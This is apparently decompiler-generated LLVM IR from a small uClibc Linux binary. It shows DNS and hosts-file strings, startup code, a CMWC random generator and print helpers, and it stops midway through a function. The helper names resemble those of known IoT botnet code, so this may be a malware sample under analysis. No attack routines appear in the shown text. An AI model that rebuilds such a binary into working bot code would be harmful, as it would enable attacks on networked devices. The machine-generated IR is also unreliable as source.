@global_var_80636d4.561 = local_unnamed_addr global i32 0
@global_var_80636d8.562 = local_unnamed_addr global i32 0
@global_var_805c50c.563 = constant [10 x i8] c"/dev/null\00"
@global_var_80636d0.565 = local_unnamed_addr global i32 0
@global_var_80636c8.566 = local_unnamed_addr global i32 0
@global_var_8054c2d.568 = constant i32 1928542531
@global_var_8054c51.569 = constant i32 1928542531
@global_var_8063704.570 = local_unnamed_addr global i32 0
@global_var_80636e4.571 = global i32 0
@global_var_805c830.573 = constant [4 x i8] c"inf\00"
@global_var_805c833.578 = constant i32 1179535616
@global_var_805c840.579 = constant i32 2883630
@global_var_8063b38.583 = local_unnamed_addr global i32 0
@global_var_805c8fc.584 = constant i32 1697579054
@global_var_805c930.585 = constant i32 1868824690
@global_var_805c8fe.586 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805c90f.587 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805c927.588 = constant [11 x i8] c"nameserver\00"
@global_var_805c932.589 = constant [7 x i8] c"domain\00"
@global_var_805c939.590 = constant [7 x i8] c"search\00"
@global_var_8063b18.591 = global i32 0
@global_var_8063b3c.592 = local_unnamed_addr global i32 0
@global_var_8063b40.593 = local_unnamed_addr global i32 0
@global_var_80614a4.594 = local_unnamed_addr global i32 0
@global_var_80614a8.595 = local_unnamed_addr global i32 0
@global_var_805d23c.596 = local_unnamed_addr global i32 2
@global_var_805c954.597 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805c951.599 = constant [3 x i8] c"%x\00"
@global_var_805c965.600 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805c970.601 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805d460.1 = local_unnamed_addr global i8 0
@global_var_80614a0.13 = external local_unnamed_addr global i8*
@global_var_805d497.27 = local_unnamed_addr global i8 0
@global_var_805d498.28 = local_unnamed_addr global i8 0
@global_var_805d499.29 = local_unnamed_addr global i8 0
@global_var_805d49a.30 = local_unnamed_addr global i8 0
@global_var_805d496.230 = local_unnamed_addr global i8 0
@global_var_8063708.232 = external local_unnamed_addr global i8*
@global_var_805d490.462 = external global i8*
@global_var_805aef9.466 = external constant i8*
@global_var_805b64a.493 = external constant i8*
@global_var_80637a0.523 = global i8 0
@global_var_8063b00.539 = local_unnamed_addr global i8 0
@global_var_80636c0.544 = local_unnamed_addr global i8 0
@global_var_80636dc.564 = local_unnamed_addr global i8 0
@global_var_80636e8.580 = external global i8*
@global_var_8063700.581 = local_unnamed_addr global i64 0
@global_var_805d444.582 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 85879
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805d460.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805d024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805d024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805d024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805d460.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805d024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805d460.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805c984.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_805d010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134548370, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134578056, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805d4a0.7, align 32
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_805d4a4.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_805d4a8.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_805d4a0.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_805d4a0.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_805d4a0.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_805d0f8.10, align 8
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_805d0f8.10, align 8
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_805d4a0.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_805d0f4.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_805d4a0.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d256 = load i8, i8* %arg2, align 1
  %v3_80483d257 = zext i8 %v2_80483d256 to i32
  %v5_80483d258 = and i32 %v4_80483c1, -256
  %v6_80483d259 = or i32 %v3_80483d257, %v5_80483d258
  %v4_80483d460 = icmp eq i8 %v2_80483d256, 0
  %v1_80483d661 = icmp eq i1 %v4_80483d460, false
  br i1 %v1_80483d661, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d264 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d259, %dec_label_pc_80483ba ]
  %v4_80483cf63 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.062 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.062, 1
  %v5_80483cc = add i32 %v4_80483cf63, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d264, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.052, 1
  %v4_8048420 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_8048420, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d38 = load i8, i8* %arg2, align 1
  %v4_804844f42 = icmp eq i8 %v2_804844d38, 0
  %v1_804845143 = icmp eq i1 %v4_804844f42, false
  br i1 %v1_804845143, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a46 = phi i32 [ %v4_804844a37, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.044, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre11, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.145, 1
  %v5_8048447 = add i32 %v4_804844a46, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.236, 1
  %v4_8048469 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_8048469, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

